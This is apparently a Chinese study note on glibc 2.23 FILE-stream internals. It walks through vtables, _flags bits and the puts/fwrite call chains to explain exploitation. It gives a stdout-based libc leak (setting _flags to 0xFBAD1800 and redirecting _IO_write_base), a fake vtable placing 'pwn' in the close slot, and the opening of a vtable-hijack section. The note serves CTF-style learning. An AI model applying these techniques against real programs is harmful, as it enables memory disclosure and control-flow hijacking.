+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316164711002.png"></p>
+<p>在标准I&#x2F;O库中，每个程序启动时有三个文件流时自动打开得&#x3D;&#x3D;》stdin，stdout，stderr</p>
+<p>&#x3D;&#x3D;》在初始状态下，_IO_list_all指向一个有这些文件流构成得链表&#x3D;&#x3D;》这三个文件流位于libc.so的数据段</p>
+<p>（使用fopen创建的文件流是分配在堆内存上的）</p>
+<h3 id="IO-FILE-plus结构："><a href="#IO-FILE-plus结构：" class="headerlink" title="_IO_FILE_plus结构："></a>_IO_FILE_plus结构：</h3><p>_IO_FILE结构外包裹着另一种结构_IO_FILE_plus，其中包含<strong>指针vtable(虚表)指向了一系列函数指针</strong>&#x3D;&#x3D;》</p>
+<p>vtable虚表：具有虚函数的类都有一张vtable，其中记录了本类中所有虚函数的函数指针&#x3D;&#x3D;》</p>
+<p>是一个函数指针数组的起始位置，通常虚表在编程中所具有的作用是为了标识父类</p>
+<p>&#x3D;&#x3D;》虚函数数表既有继承性又有多态性</p>
+<p>vtable是IO_jump_t类型的指针，IO_jump_t中保存了一些函数指针，在一系列标准IO函数中会调用中会调用这个函数指针&#x3D;&#x3D;》</p>
+<p>如果使用_IO_FILE_plus定义一个结构体指针&#x3D;&#x3D;》既可以使用IO_FILE中的结构体成员变量，也能使用IO_jump_t中的函数指针</p>
+<p>在libc2.23下，32位的vtable偏移为0x94，64位偏移为0xd8&#x3D;&#x3D;》</p>
+<p>pwndbg&#x2F;glibc-2.23&#x2F;libio&#x2F;libioP.h</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316171135146.png"></p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> funcs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">1</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// "extra word"</span>
+   <span class="token number">2</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// DUMMY</span>
+   <span class="token number">3</span> exit<span class="token punctuation">,</span> <span class="token comment">// finish</span>
+   <span class="token number">4</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// overflow</span>
+   <span class="token number">5</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// underflow</span>
+   <span class="token number">6</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// uflow</span>
+   <span class="token number">7</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// pbackfail</span>
+   
+   <span class="token number">8</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// xsputn</span>
+   <span class="token number">9</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// xsgetn</span>
+   <span class="token number">10</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seekoff</span>
+   <span class="token number">11</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seekpos</span>
+   <span class="token number">12</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// setbuf</span>
+   <span class="token number">13</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// sync</span>
+   <span class="token number">14</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// doallocate</span>
+   <span class="token number">15</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// read</span>
+   <span class="token number">16</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// write</span>
+   <span class="token number">17</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seek</span>
+   <span class="token number">18</span> pwn<span class="token punctuation">,</span>  <span class="token comment">// close</span>
+   <span class="token number">19</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// stat</span>
+   <span class="token number">20</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// showmanyc</span>
+   <span class="token number">21</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// imbue</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
+
+
+
+<h3 id="flags规则："><a href="#flags规则：" class="headerlink" title="_flags规则："></a>_flags规则：</h3><p>IO_FILE结构体中的第一个成员变量</p>
+<h5 id="规则："><a href="#规则：" class="headerlink" title="规则："></a>规则：</h5><p>_flag的高两位字节是由libc固定的&#x3D;&#x3D;》0xfbad0000</p>
+<p>高两位字节是一个标识，标志这是一个什么文件</p>
+<p>低两位字节的位数规则决定了程序的执行状态</p>
+<p>低两位规则：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316200317118.png"></p>
+<p>在执行流程中国会将_flag和定义常量进行按位与运算，并根据与运算的机构进行判断如何执行</p>
+<h3 id="标准库函数介绍"><a href="#标准库函数介绍" class="headerlink" title="标准库函数介绍"></a>标准库函数介绍</h3><h4 id="fread"><a href="#fread" class="headerlink" title="fread:"></a>fread:</h4><p>fread是标准IO库函数，作用为从文件流中读数据</p>
+<p>函数原型：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> <span class="token function">fread</span> <span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span> <span class="token punctuation">;</span></code></pre>
+
+<p>参数介绍：</p>
+<p>buffer：存放读取数据的缓冲区</p>
+<p>size：指定每个记录的长度</p>
+<p>count：指定记录的个数</p>
+<p>stream：目标文件流</p>
+<p>返回值：返回读取到数据缓冲区中的记录个数</p>
+<h5 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h5><p>fread位于&#x2F;libio&#x2F;iofread.c中，函数名为_IO_fread,真正实现功能为子函数_IO_sgetn:</p>
+<pre class="language-c" data-language="c"><code class="language-c">_IO_size_t
+<span class="token function">_IO_fread</span> <span class="token punctuation">(</span>buf<span class="token punctuation">,</span> size<span class="token punctuation">,</span> count<span class="token punctuation">,</span> fp<span class="token punctuation">)</span>
+     <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>
+     _IO_size_t size<span class="token punctuation">;</span>
+     _IO_size_t count<span class="token punctuation">;</span>
+     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  bytes_read <span class="token operator">=</span> <span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> bytes_requested<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>_IO_sgent函数中会调用_IO_XSGETN&#x3D;&#x3D;&gt;是_IO_FILE_plus.vtable中的函数指针，在进行调用时会先取出vtable中的指针然后再进行调用</p>
+<pre class="language-c" data-language="c"><code class="language-c">_IO_size_t
+<span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
+     <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
+     _IO_size_t n<span class="token punctuation">;</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> <span class="token function">_IO_XSGETN</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>在默认情况下函数指针指向_IO_file_xsgetn函数：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base
+        <span class="token operator">&amp;&amp;</span> want <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__underflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">continue</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<h4 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite:"></a>fwrite:</h4><p>fwrite是标准IO库函数，作用是向文件流写入数据</p>
+<p>函数原型：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span> buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span> FILE<span class="token operator">*</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>buffer：指针，对fwite，是要写入数据的地址</p>
+<p>size：要写入内容的单字节数</p>
+<p>count：要进行写入size字节的数据项的个数</p>
+<p>stream：目标文件指针</p>
+<p>返回值：实际写入的数据项个数count</p>
+<h5 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h5><p>位于&#x2F;libio&#x2F;iofwrite.c中，函数名为_IO_fwrite，主要作用为调用_IO_XSPUTN来实现写入功能</p>
+<p>&#x3D;&#x3D;》位于_IO_FILE_plus的vtable中，调用这个函数需要首先取出vtable中的指针，再跳转进行调用</p>
+<pre class="language-c" data-language="c"><code class="language-c">written <span class="token operator">=</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>在_IO_XSPUTN对应的默认函数_IO_new_file_xsputn中会调用同样位于vtable中的_IO_OVERFLOW</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/* Next flush the (full) buffer. */</span>
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span></code></pre>
+
+<p>在_IO_new_file_overflow内部最终会调用系统接口write函数</p>
+<h4 id="fopen："><a href="#fopen：" class="headerlink" title="fopen："></a>fopen：</h4><p>fopen在标准IO库中用于打开文件</p>
+<p>函数原型：</p>
+<pre class="language-c" data-language="c"><code class="language-c">FILE <span class="token operator">*</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token operator">*</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>filename：目标文件的路径</p>
+<p>type：打开方式的类型</p>
+<p>返回值：返回一个文件指针</p>
+<h5 id="执行流程："><a href="#执行流程：" class="headerlink" title="执行流程："></a>执行流程：</h5><p>在fopen对应的函数__fopen_internal内部会调用malloc函数，分配FILE结构的空间&#x3D;&#x3D;》</p>
+<p>FILE结构是存储在堆上的：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token operator">*</span>new_f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">locked_FILE</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">locked_FILE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>之后会为创建的FILE初始化vtable，并调用_IO_file_init进一步初始化操作</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">_IO_JUMPS</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-></span>fp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>_IO_file_jumps<span class="token punctuation">;</span>
+<span class="token function">_IO_file_init</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-></span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>在_IO_file_init函数初始化中，会调用_IO_link_in把新分配的FILE链入_IO_list_all为起始的FILE链表中</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span>
+<span class="token function">_IO_link_in</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span>
+     <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span>fp<span class="token punctuation">;</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>file<span class="token punctuation">.</span>_flags <span class="token operator">&amp;</span> _IO_LINKED<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      fp<span class="token operator">-></span>file<span class="token punctuation">.</span>_flags <span class="token operator">|=</span> _IO_LINKED<span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>file<span class="token punctuation">.</span>_chain <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>
+      _IO_list_all <span class="token operator">=</span> fp<span class="token punctuation">;</span>
+      <span class="token operator">++</span>_IO_list_all_stamp<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>之后_fopen_internal函数会调用_IO_file_fopen函数打开目标文件，_IO_file_fopen会根据拥护传入的打开模式进行打开操作，最后会调用到系统接口open函数</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_file_fopen</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> new_f<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> is32<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token function">__fopen_maybe_mmap</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-></span>fp<span class="token punctuation">.</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>&#x3D;&#x3D;》fopen操作：</p>
+<p>使用malloc分配FILE结构&#x3D;&#x3D;》设置FILE结构的vtable&#x3D;&#x3D;》初始化分配的FILE结构&#x3D;&#x3D;》</p>
+<p>将初始化的FILE结构链入FILE结构链表中&#x3D;&#x3D;》调用系统调用打开文件</p>
+<h4 id="fclose："><a href="#fclose：" class="headerlink" title="fclose："></a>fclose：</h4><p>是标准IO库中用于关闭已打开文件的函数</p>
+<p>函数原型：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fclose</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span></code></pre>
+
+<p>&#x3D;&#x3D;》关闭一个文件流，使用fclose就可以把缓冲区最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>
+<h5 id="执行流程：-1"><a href="#执行流程：-1" class="headerlink" title="执行流程："></a>执行流程：</h5><p>首先调用_IO_unlink_it将指定的FILE从_chain链表中脱链</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_file_flags <span class="token operator">&amp;</span> _IO_IS_FILEBUF<span class="token punctuation">)</span>
+    <span class="token function">_IO_un_link</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>调用_IO_file_close_it函数，_IO_file_close_it会调用系统接口close关闭文件</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_file_flags <span class="token operator">&amp;</span> _IO_IS_FILEBUF<span class="token punctuation">)</span>
+    status <span class="token operator">=</span> <span class="token function">_IO_file_close_it</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>最后调用vtable中的_IO_FINSH&#x3D;&#x3D;》对应_IO_file_finish函数，其中会调用free函数释放之前分配的FILE结构</p>
+<h3 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h3><h4 id="puts-函数执行流程（详细）："><a href="#puts-函数执行流程（详细）：" class="headerlink" title="puts()函数执行流程（详细）："></a>puts()函数执行流程（详细）：</h4><h5 id="1、-IO-puts–-gt-IO-new-file-xsputn"><a href="#1、-IO-puts–-gt-IO-new-file-xsputn" class="headerlink" title="1、_IO_puts–&gt;_IO_new_file_xsputn:"></a>1、_IO_puts–&gt;_IO_new_file_xsputn:</h5><p>puts()函数在源码中的表现形式为_IO_puts&#x3D;&#x3D;》libio&#x2F;ioputs.c</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316201947381.png"></p>
+<p>在_IO_puts在过程中调用了一个叫做_IO_spitn函数（_IO_fwrite也会进行调用）</p>
+<p>_IO_sputn&#x3D;&#x3D;》宏&#x3D;&#x3D;》调用_IO_2_1_stdout_中的vtable所指向的_xsputn，也就是_IO_new_file_xsputn函数</p>
+<h5 id="2、-IO-new-file-xsputn-–-gt-IO-OVERFLOW"><a href="#2、-IO-new-file-xsputn-–-gt-IO-OVERFLOW" class="headerlink" title="2、_IO_new_file_xsputn –&gt;_IO_OVERFLOW"></a>2、_IO_new_file_xsputn –&gt;_IO_OVERFLOW</h5><p>libio&#x2F;fileops.c</p>
+<p>函数执行过程：</p>
+<p>首先进入函数之后判断输出缓冲区还有多少空间&#x3D;&#x3D;》由_IO_write_end - _IO_write_base得来</p>
+<p>&#x3D;&#x3D;》这两个都是FILE结构体中的两个成员变量&#x3D;&#x3D;》分别是输出结束地址和起始输出地址&#x3D;&#x3D;》</p>
+<p>stdout也是FILE结构&#x3D;&#x3D;》接下来如果缓冲区有空间，则先把数据载入输出缓冲区并计算目标输出数据是否有剩余</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316203003176.png"></p>
+<p>经过图中判断，如果还有剩余说明输出缓冲区未建立或者空间已满&#x3D;&#x3D;》需要通过_IO_OVERFLOW函数来建立或清空缓冲区</p>
+<p>_IO_OVERFLOW函数主要实现刷新缓冲区或建立缓冲区，在vtable中为__overflow</p>
+<h5 id="3、-IO-new-file-overflow-–》-IO-do-wrote"><a href="#3、-IO-new-file-overflow-–》-IO-do-wrote" class="headerlink" title="3、_IO_new_file_overflow –》_IO_do_wrote"></a>3、_IO_new_file_overflow –》_IO_do_wrote</h5><p>libio&#x2F;fileops.c</p>
+<p>函数执行流程：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316205918225.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316210035648.png"></p>
+<p>利用点：</p>
+<p>_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</p>
+<p>&#x3D;&#x3D;》_IO_do_write为需要执行的目标函数，该函数执行后会调用write输出到输出缓冲区</p>
+<p>&#x3D;&#x3D;》参数：stdout结构体，_IO_write_base（输出缓冲区起始地址）和size(由_IO_write_end - _IO_write_base得来)</p>
+<p>利用：</p>
+<p>事先在stdout的_IO_write_base的位置部署要输出的起始地址&#x3D;&#x3D;》去利用_IO_do_write函数&#x3D;&#x3D;》</p>
+<p>打印部分内存地址&#x3D;&#x3D;》泄漏libc</p>
+<p>利用条件：</p>
+<p>需要绕过_IO_new_file_overflow函数的检查&#x3D;&#x3D;》</p>
+<p><strong>第一个判断：</strong>判断标志位是否包含_IO_NO_WRITES，将_flags和_IO_NO_WRITES进行一个按位与的操作</p>
+<p>_flags与_IO_NO_WRITES各自定义的常量：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_MAGIC</span> <span class="token expression"><span class="token number">0xFBAD0000</span> </span><span class="token comment">/* 魔数 */</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_NO_WRITES</span> <span class="token expression"><span class="token number">8</span> </span><span class="token comment">/* 不可写 */</span></span></code></pre>
+
+<p>&#x3D;&#x3D;》进行按位与操作之后结果为真，返回错误&#x3D;&#x3D;》_IO_do_write将不再执行&#x3D;&#x3D;》</p>
+<p>将与运算为假&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_MAGIC</span> <span class="token expression"><span class="token number">0xFBAD0000</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_NO_WRITES</span> <span class="token expression"><span class="token number">8</span></span></span>
+_flags <span class="token operator">&amp;</span> _IO_NO_WRITES <span class="token operator">=</span> <span class="token number">0</span> 
+_flags <span class="token operator">=</span> <span class="token number">0xfbad0000</span></code></pre>
+
+<p>与运算为假后将不执行判断中语句&#x3D;&#x3D;》</p>
+<p><strong>第二个判断：</strong>检查输出缓冲区是否为空</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> f<span class="token operator">-></span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></code></pre>
+
+<p>为空则进行分配空间，初始化指针&#x3D;&#x3D;》会覆盖掉事先在stdout的_IO_write_base的数据&#x3D;&#x3D;》</p>
+<p>需要将该判断为假&#x3D;&#x3D;》</p>
+<p>f-&gt;_IO_write_base &#x3D;&#x3D; NULL&#x3D;&#x3D;》在_IO_write_base中部署数据&#x3D;&#x3D;》0</p>
+<p>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) &#x3D;&#x3D; 0  &#x3D;&#x3D;》f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING&#x3D;1</p>
+<p>&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_MAGIC</span> <span class="token expression"><span class="token number">0xFBAD0000</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_CURRENTLY_PUTTING</span> <span class="token expression"><span class="token number">0x800</span></span></span>
+f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING <span class="token operator">=</span> <span class="token number">1</span>
+_flags <span class="token operator">=</span> <span class="token number">0xfbad0800</span></code></pre>
+
+
+
+<h5 id="4、-IO-new-do-write-–-gt-new-do-write"><a href="#4、-IO-new-do-write-–-gt-new-do-write" class="headerlink" title="4、_IO_new_do_write –&gt; new_do_write"></a>4、_IO_new_do_write –&gt; new_do_write</h5><p>libio&#x2F;fileops.c</p>
+<p>函数执行流程：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317094606004.png"></p>
+<p>掉用new_do_write函数</p>
+<p>参数：</p>
+<p>一参：stdout结构体</p>
+<p>二参：输出缓冲区起始地址</p>
+<p>三参：输出长度</p>
+<h5 id="5、new-do-write-–-gt-IO-SYSWRITE"><a href="#5、new-do-write-–-gt-IO-SYSWRITE" class="headerlink" title="5、new_do_write –&gt; _IO_SYSWRITE"></a>5、new_do_write –&gt; _IO_SYSWRITE</h5><p>libio&#x2F;fileops.c</p>
+<p>函数执行流程：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317094925459.png"></p>
+<p>&#x3D;&#x3D;》_IO_SYSWRITE (fp, data, to_do);函数就是IO_FILE的最终目标，执行系统调用write&#x3D;&#x3D;》</p>
+<p>需要先满足两个判断其中一个&#x3D;&#x3D;》</p>
+<p><strong>第一个判断（推荐使用）：</strong></p>
+<p>只需要满足fp-&gt;_flags &amp; _IO_IS_APPENDING &#x3D; 1即可绕过判断&#x3D;&#x3D;》</p>
+<p>if内执行流程：</p>
+<p>将偏移设置为标准值，对后续的输出流程没有影响</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_MAGIC</span> <span class="token expression"><span class="token number">0xFBAD0000</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_IS_APPENDING</span> <span class="token expression"><span class="token number">0x1000</span></span></span>
+fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING <span class="token operator">=</span> <span class="token number">1</span>
+_flags <span class="token operator">=</span> <span class="token number">0xfbad1000</span></code></pre>
+
+<p>&#x3D;&#x3D;》<strong>到达_IO_SYSWRITE系统调用</strong></p>
+<p><strong>第二个判断（不去使用）：</strong></p>
+<p>只需满足fp-&gt;_IO_read_end &#x3D; fp-&gt;_IO_write_base即可绕过判断&#x3D;&#x3D;》</p>
+<p>在随机保护的开启，一般是通过覆盖末位字节造成偏移，即使是随机化偏移也有0x1000的对齐&#x3D;&#x3D;》</p>
+<p><strong>不去使用原因：</strong></p>
+<p>1、_IO_read_end和_IO_write_base存放的地址是由<strong>末位字节和其他高字节</strong>共同组成的，其他高字节由于随机化的缘故无法确定</p>
+<p>2、</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220317101834554.png"></p>
+<p>调用了_IO_SYSSEEK系统调用&#x3D;&#x3D;》lssek函数&#x3D;&#x3D;》</p>
+<p>将_IO_read_end的值设置为0&#x3D;&#x3D;》fp-&gt;_IO_write_base - fp-&gt;_IO_read_end的值变得非常大&#x3D;&#x3D;》</p>
+<p>导致sleek函数执行不成功导致退出</p>
+<p>sleek函数：可以更改读写一个文件时读写指针的一个系统调用</p>
+<p>&#x3D;&#x3D;》载入内存的数据范围可能并不大，经过sleek函数的修改过大的偏移之后超过了数据范围的边界&#x3D;&#x3D;》</p>
+<p>sleek函数执行不成功导致退出&#x3D;&#x3D;》不会到达_IO_SYSWRITE系统调用</p>
+<p><strong>原因总结：</strong>1，2会让我们无法完全掌控_IO_read_end和_IO_write_base中的数值&#x3D;&#x3D;》进入else if的分支后程序执行不可控</p>
+<h4 id="利用总结："><a href="#利用总结：" class="headerlink" title="利用总结："></a>利用总结：</h4><p>对_flags设定：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_MAGIC</span> <span class="token expression"><span class="token number">0xFBAD0000</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_NO_WRITES</span> <span class="token expression"><span class="token number">8</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_CURRENTLY_PUTTING</span> <span class="token expression"><span class="token number">0x800</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_IS_APPENDING</span> <span class="token expression"><span class="token number">0x1000</span></span></span></code></pre>
+
+<pre class="language-none"><code class="language-none">_flags &amp; _IO_NO_WRITES &#x3D; 0
+_flags &amp; _IO_CURRENTLY_PUTTING &#x3D; 1
+_flags &amp; _IO_IS_APPENDING &#x3D; 1</code></pre>
+
+<p>&#x3D;&#x3D;》</p>
+<pre class="language-none"><code class="language-none">_flags &#x3D; 0xFBAD1800</code></pre>
+
+<p>&#x3D;&#x3D;》</p>
+<p>设置_IO_write_base指向想要泄漏的地址</p>
+<p>_IO_write_ptr指向泄漏结束的地址（不需要一定设置指向结尾，程序中自带的地址足够泄漏libc）</p>
+<h3 id="伪造vtable劫持程序流程："><a href="#伪造vtable劫持程序流程：" class="headerlink" title="伪造vtable劫持程序流程："></a>伪造vtable劫持程序流程：</h3><p>劫持方式：</p>
+<p><strong>1、改写vtable中的函数指针</strong></p>
